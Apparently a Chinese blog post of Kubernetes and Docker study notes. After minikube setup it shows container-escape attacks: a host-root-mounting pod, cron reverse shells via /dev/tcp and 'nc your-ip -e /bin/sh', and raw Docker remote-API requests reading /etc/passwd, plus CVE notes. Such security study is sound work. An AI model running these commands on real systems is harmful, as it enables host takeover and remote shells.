@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="Zh/Cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="容器扫描器https://www.dosec.cn/article/id/50.html 环境搭建在线学习平台1https://magicsandbox.com  本地最小平台12https://minikube.sigs.k8s.io/docs/start/https://kubernetes.io/zh/docs/tutorials/hello-minikube/  创建集群minikube1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="k8s学习与攻击">
+<meta property="og:url" content="http://yangge.me/2021/12/24/云/index.html">
+<meta property="og:site_name">
+<meta property="og:description" content="容器扫描器https://www.dosec.cn/article/id/50.html 环境搭建在线学习平台1https://magicsandbox.com  本地最小平台12https://minikube.sigs.k8s.io/docs/start/https://kubernetes.io/zh/docs/tutorials/hello-minikube/  创建集群minikube1">
+<meta property="og:locale" content="Zh/Cn">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/e6e3f28906404489d214205a0fac542c-843779">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/c8bbc896bf4a77604601f96fbd189e46-163554">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/02b92fd9448226d221e9922d9129e10d-231076">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/d8950446f5eff2f11268ed324736710e-153154">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/189fade8e43b37ff6c3c6663275c5d81-68635">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/8b28df03a3dca8fe5bc3afecb266779f-69462">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/52e0b66d580449dad9c677efb4754ac0-167138">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/62b4b737605671bbef54ea3a211fbb5c-220268">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/49d662d2e3579b69632c118b31e7cee0-155714">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/143aa6ba5e452afcc3b1e7ccd6c5419d-105742">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/97ce4dc84299fbfe428e746d7f9a6e59-265584">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/5c214949f7480aa9292831bc188a7f8a-280197">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/6ca4a8b438aebdcf79f506ed80b8b77d-282614">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/e22eb8e607884e738f77942b4fa90f35-275311">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/251f20c06cf458ab3c32458f669c03e3-115552">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/38c64c747ad613094fd224c9f16dda33-101940">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/b3189a7327e391a79d706f7da9dfe4a8-97378">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/b8a3de623dab9b5f0b41b37d23c9571e-26480">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/1cd5358ce589978cf5fe0a9c0fdee808-120066">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/5089010af07754908430a4169c9b9aa7-190999">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/bcf49e3dba238f1221d8632e65686f61-334717">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/03bb2839b15cc6efa8e69f0c2fdf7ca2-265835">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/738225ebe13522b8dbf038ccad79d7a8-447347">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/4ea2a8c35ab1f0553c3d589d1476f0d8-79487">
+<meta property="og:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/dd11b65266595383cf80905f45f227ab-237594">
+<meta property="og:updated_time" content="2021-12-24T07:37:58.774Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="k8s学习与攻击">
+<meta name="twitter:description" content="容器扫描器https://www.dosec.cn/article/id/50.html 环境搭建在线学习平台1https://magicsandbox.com  本地最小平台12https://minikube.sigs.k8s.io/docs/start/https://kubernetes.io/zh/docs/tutorials/hello-minikube/  创建集群minikube1">
+<meta name="twitter:image" content="https://app.yinxiang.com/FileSharing.action?hash=1/e6e3f28906404489d214205a0fac542c-843779">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yangge.me/2021/12/24/云/"/>
+
+
+
+
+
+  <title>k8s学习与攻击 | </title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="Zh/Cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title"></span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yangge.me/2021/12/24/云/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="yangge">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">k8s学习与攻击</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-12-24T15:12:14+08:00">
+                2021-12-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2021/12/24/云/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2021/12/24/云/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="容器扫描器"><a href="#容器扫描器" class="headerlink" title="容器扫描器"></a>容器扫描器</h3><p><a href="https://www.dosec.cn/article/id/50.html" target="_blank" rel="noopener">https://www.dosec.cn/article/id/50.html</a></p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>在线学习平台<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://magicsandbox.com</span><br></pre></td></tr></table></figure></p>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/e6e3f28906404489d214205a0fac542c-843779" class="en-media" width="2152" height="1268"></p>
+<p>本地最小平台<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://minikube.sigs.k8s.io/docs/start/</span><br><span class="line">https://kubernetes.io/zh/docs/tutorials/hello-minikube/</span><br></pre></td></tr></table></figure></p>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/c8bbc896bf4a77604601f96fbd189e46-163554" class="en-media" width="1908" height="840"></p>
+<h3 id="创建集群"><a href="#创建集群" class="headerlink" title="创建集群"></a>创建集群</h3><h4 id="minikube"><a href="#minikube" class="headerlink" title="minikube"></a>minikube</h4><p>1、环境搭建<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install minikube</span><br></pre></td></tr></table></figure></p>
+<p>2、启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">minikube start</span><br><span class="line">在中国</span><br><span class="line">minikube start --image-mirror-country=&apos;cn&apos; --image-repository=&apos;registry.cn-hangzhou.aliyuncs.com/google_containers&apos;</span><br></pre></td></tr></table></figure></p>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/02b92fd9448226d221e9922d9129e10d-231076" class="en-media" width="2288" height="540"></p>
+<p>3、访问集群<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get po -A</span><br></pre></td></tr></table></figure></p>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/d8950446f5eff2f11268ed324736710e-153154" class="en-media" width="2012" height="446"></p>
+<p>4、部署应用<br><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/189fade8e43b37ff6c3c6663275c5d81-68635" class="en-media" width="1780" height="224"></p>
+<p>5、访问服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">minikube service hello-minikube</span><br><span class="line">kubectl port-forward service/hello-minikube 7080:8080</span><br></pre></td></tr></table></figure></p>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/8b28df03a3dca8fe5bc3afecb266779f-69462" class="en-media" width="1154" height="406"><br><br><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/52e0b66d580449dad9c677efb4754ac0-167138" class="en-media" width="2124" height="810"><br><br><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/62b4b737605671bbef54ea3a211fbb5c-220268" class="en-media" width="1542" height="706"></p>
+<p>6、管理集群<br><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/49d662d2e3579b69632c118b31e7cee0-155714" class="en-media" width="1244" height="1208"></p>
+<p>7、启动 kubernets 管理面板</p>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/143aa6ba5e452afcc3b1e7ccd6c5419d-105742" class="en-media" width="3194" height="380"><br><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/97ce4dc84299fbfe428e746d7f9a6e59-265584" class="en-media" width="3830" height="1186"></p>
+<h3 id="攻击kubernets"><a href="#攻击kubernets" class="headerlink" title="攻击kubernets"></a>攻击kubernets</h3><p>先看官方文档说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://kubernetes.io/zh/docs/concepts/security/controlling-access/</span><br></pre></td></tr></table></figure></p>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/5c214949f7480aa9292831bc188a7f8a-280197" class="en-media" width="1782" height="1258"></p>
+<p>所以默认访问localhost:8080即可查看api<br><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/6ca4a8b438aebdcf79f506ed80b8b77d-282614" class="en-media" width="1052" height="1352"></p>
+<p>利用工具 kubectl 来控制容器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">获取所有节点</span><br><span class="line">kubectl -s http://127.0.0.1:60497/ get nodes</span><br><span class="line">获取所有容器</span><br><span class="line">kubectl -s http://127.0.0.1:60497/ get pods --all-namespaces=true</span><br><span class="line">在容器中获得一个交互式shell</span><br><span class="line">kubectl -s http://1.2.3.4:8080/ --namespace=default exec -it myapp bash</span><br></pre></td></tr></table></figure></p>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/e22eb8e607884e738f77942b4fa90f35-275311" class="en-media" width="2810" height="794"></p>
+<p>利用api 获取宿主机权限<br><code>创建新的容器 -&gt; 挂载宿主机目录 -&gt; 写 /etc/crontab 定时任务反弹 shell</code></p>
+<p>创建新的容器</p>
+<p>myapp.yaml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: myapp</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - image: nginx</span><br><span class="line">    name: test-container</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - mountPath: /mnt</span><br><span class="line">      name: test-volume</span><br><span class="line">  volumes:</span><br><span class="line">  - name: test-volume</span><br><span class="line">    hostPath:</span><br><span class="line">      path: /</span><br></pre></td></tr></table></figure></p>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/251f20c06cf458ab3c32458f669c03e3-115552" class="en-media" width="1526" height="874"></p>
+<p>获取该容器的交互式shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://kubernetes.io/zh/docs/tasks/debug-application-cluster/get-shell-running-container/</span><br><span class="line"></span><br><span class="line">// 本地测试提示没权限，不知道为啥，但是可以通过web界面直接进入容器</span><br><span class="line">kubectl --server http://127.0.0.1:60497/ exec -it shell-demo -- /bin/bash</span><br><span class="line"></span><br><span class="line">echo -e &quot;* * * * * root bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1\n&quot; &gt;&gt; /mnt/etc/crontab</span><br></pre></td></tr></table></figure></p>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/38c64c747ad613094fd224c9f16dda33-101940" class="en-media" width="2250" height="600"></p>
+<h4 id="容器安全"><a href="#容器安全" class="headerlink" title="容器安全"></a>容器安全</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Docker 镜像的主要利用来源之一是易受攻击的包。例如，使用易受攻击的影子包的 Docker 镜像漏洞 (CVE-2019-5021) 允许任何拥有 shell 访问权限的用户或黑客提升他们在容器内的权限。另一个易受攻击的包是 sqlite3 3.26.0，该包存在允许远程代码执行的漏洞，如果攻击者发送恶意 SQL 命令，则会受到攻击。</span><br><span class="line"></span><br><span class="line">ps:</span><br><span class="line">使用其他各种商用工具和开源工具来确保容器镜像安全，比如 Twistlock、CoreOS Clair、Dagda 和 Anchore</span><br></pre></td></tr></table></figure>
+<h5 id="CVE-2019-5021"><a href="#CVE-2019-5021" class="headerlink" title="CVE-2019-5021"></a>CVE-2019-5021</h5><p>自 Alpine Linux 3.3 版本开始的所有 Docker 镜像中，root 用户包含一个空密码，这可能会导致攻击者获得 root 权限，进而造成攻击。</p>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/b3189a7327e391a79d706f7da9dfe4a8-97378" class="en-media" width="1068" height="586"></p>
+<h5 id="CVE-2019-14271"><a href="#CVE-2019-14271" class="headerlink" title="CVE-2019-14271"></a>CVE-2019-14271</h5><p>CVE-2019-14271是Docker cp命令实现中存在的一个安全问题，攻击者可以利用该漏洞实现完整的容器逃逸.</p>
+<p>利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">需要控制容器，篡改libnss_*.so库</span><br><span class="line">当宿主机执行 docker cp 命令时，触发漏洞</span><br></pre></td></tr></table></figure></p>
+<h5 id="CVE-2020-15257"><a href="#CVE-2020-15257" class="headerlink" title="CVE-2020-15257"></a>CVE-2020-15257</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者可以借助这个漏洞突破容器命名空间隔离，实现容器逃逸。影响containerd 1.3.x, 1.2.x, 1.4.x版本，需要启动容器时使用 host 模式 --network=host</span><br></pre></td></tr></table></figure>
+<hr>
+<p>知识点：<br>一、<br>在使用docker run命令创建并运行容器时，可以使用–network选项指定容器的网络模式。Docker有以下4种网络模式：<br>1) none：这种模式下容器内部只有loopback回环网络，没有其他网卡，不能访问外网，完全封闭的网络；</p>
+<p>2) container：指定一个已经存在的容器名字，新的容器会和这个已经存在的容器共享一个网络命名空间，IP、端口范围一起在这两个容器中也可共享；</p>
+<p>3) bridge：这是docker默认的网络模式，会为每一个容器分配网络命名空间，设置IP，保证容器内的进程使用独立的网络环境，使得容器和容器之间、容器和主机之间实现网络隔离；</p>
+<p>4) host：这种模式下，容器和主机已经没有网络隔离了，它们共享同一个网络命名空间，容器的网络配置和主机完全一样，使用主机的IP地址和端口，可以查看到主机所有网卡信息、网络资源，在网络性能上没有损耗。但也正是因为没有网络隔离，容器和主机容易产生网络资源冲突、争抢，以及其他的一些问题。</p>
+<p>二、<br>通过访问/proc/net/unix文件，可以获取到当前网络命名空间下所有的Unix域套接字信息。</p>
+<p>在默认情况下，docker run启动的容器的网络模式是bridge，容器和主机之间实现了网络隔离，所以在容器内部读取/proc/net/unix文件，看不到任何信息，如下所示：</p>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/b8a3de623dab9b5f0b41b37d23c9571e-26480" class="en-media" width="1102" height="182"><br>但是在host模式下，由于容器和主机共享同一个网络命名空间，容器能访问到主机中的所有网络资源，所以在容器内部读取/proc/net/unix文件，显示的就是真实主机中的信息，如下所示：<br><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/1cd5358ce589978cf5fe0a9c0fdee808-120066" class="en-media" width="1104" height="842"><br>1) /var/run/docker.sock：Docker Daemon监听的Unix域套接字，用于Docker client之间通信<br>2) /run/containerd/containerd.sock：containerd监听的Unix域套接字，Docker Daemon、ctr可以通过它和containerd通信<br>3) @/containerd-shim/3d6a9ed878c586fd715d9b83158ce32b6109af11991bfad4cf55fcbdaf6fee76.sock：这个就是上文所述的，containerd-shim监听的Unix域套接字，containerd通过它和containerd-shim通信，控制管理容器。</p>
+<p>/var/run/docker.sock、/run/containerd/containerd.sock这两者是普通的文件路径，虽然容器共享了主机的网络命名空间，但没有共享mnt命名空间，容器和主机之间的磁盘挂载点和文件系统仍然存在隔离，所以在容器内部仍然不能通过/var/run/docker.sock、/run/containerd/containerd.sock这样的路径连接对应的Unix域套接字。</p>
+<p>但是@/containerd-shim/3d6a9ed878c586fd715d9b83158ce32b6109af11991bfad4cf55fcbdaf6fee76.sock这一类的抽象Unix域套接字不一样，它没有依靠mnt命名空间做隔离，而是依靠网络命名空间做隔离，也就是说，host模式下，容器共享了主机的网络命名空间，也就能够去连接@/containerd-shim/3d6a9ed878c586fd715d9b83158ce32b6109af11991bfad4cf55fcbdaf6fee76.sock这一类的抽象Unix域套接字。</p>
+<p>而且在默认情况下，容器内部的进程都是以root用户启动的，所以也能通过UnixSocketRequireSameUser的校验。</p>
+<p>在这两者的共同作用下，容器内部的进程就可以像主机中的containerd一样，连接containerd-shim监听的抽象Unix域套接字，调用containerd-shim提供的各种API，从而实现容器逃逸。</p>
+<h5 id="docker-remote-api-未授权访问"><a href="#docker-remote-api-未授权访问" class="headerlink" title="docker remote api 未授权访问"></a>docker remote api 未授权访问</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为了实现集群管理，Docker Daemon作为守护进程，运行在后台，可以执行发送到管理接口上的Docker命令。启动Docker Daemon时，加入-H 0.0.0.0:2375，Docker Daemon就可以接收远端的Docker Client发送的指令。而此时docker rest api（默认端口2375）认证的缺陷，把2375端口作为非加密端口暴露出来，没有任何加密和认证过程，只要知道Docker主机的IP，任何人都可以匹配到这个端口，进而触发安全漏洞。若Docker存在未授权访问漏洞，访问http://host:2375/containers/json时，会返回服务器当前运行的container列表，和在docker CLI上执行docker ps的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成</span><br></pre></td></tr></table></figure>
+<p>命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker -H ip:2375 ps -a</span><br><span class="line"></span><br><span class="line">http://IP:2375/containers/json</span><br></pre></td></tr></table></figure></p>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/5089010af07754908430a4169c9b9aa7-190999" class="en-media" width="1740" height="1062"></p>
+<p>获取所有的容器列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -X GET http://&lt;docker_host&gt;:PORT/containers/json</span><br></pre></td></tr></table></figure></p>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/bcf49e3dba238f1221d8632e65686f61-334717" class="en-media" width="1686" height="1472"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /containers/5b14c019184f654df480d699e4708ac5e4ce8363d45ab5861f064c0d16a9c69f/exec HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:2375</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 184</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;AttachStdin&quot;: true,</span><br><span class="line">  &quot;AttachStdout&quot;: true,</span><br><span class="line">  &quot;AttachStderr&quot;: true,</span><br><span class="line">  &quot;Cmd&quot;: [&quot;cat&quot;, &quot;/etc/passwd&quot;],</span><br><span class="line">  &quot;DetachKeys&quot;: &quot;ctrl-p,ctrl-q&quot;,</span><br><span class="line">  &quot;Privileged&quot;: true,</span><br><span class="line">  &quot;Tty&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/03bb2839b15cc6efa8e69f0c2fdf7ca2-265835" class="en-media" width="2936" height="778"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /exec/bcd0bff3000999c540bf144e347b468e7a45ceb9d3054bc14587819bfb8a4c04/start HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:2375</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"> &quot;Detach&quot;: false,</span><br><span class="line"> &quot;Tty&quot;: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img ext="png" src="https://app.yinxiang.com/FileSharing.action?hash=1/738225ebe13522b8dbf038ccad79d7a8-447347" class="en-media" width="3112" height="1196"></p>
+<h5 id="Docker-python-api"><a href="#Docker-python-api" class="headerlink" title="Docker python api"></a>Docker python api</h5><p>利用python 搞计划任务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=&apos;http://your-ip:2375/&apos;)</span><br><span class="line">data = client.containers.run(&apos;alpine:latest&apos;, r&apos;&apos;&apos;sh -c &quot;echo &apos;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&apos; &gt;&gt; /tmp/etc/crontabs/root&quot; &apos;&apos;&apos;, remove=True, volumes=&#123;&apos;/etc&apos;: &#123;&apos;bind&apos;: &apos;/tmp/etc&apos;, &apos;mode&apos;: &apos;rw&apos;&#125;&#125;)</span><br></pre></td></tr></table></figure></p>
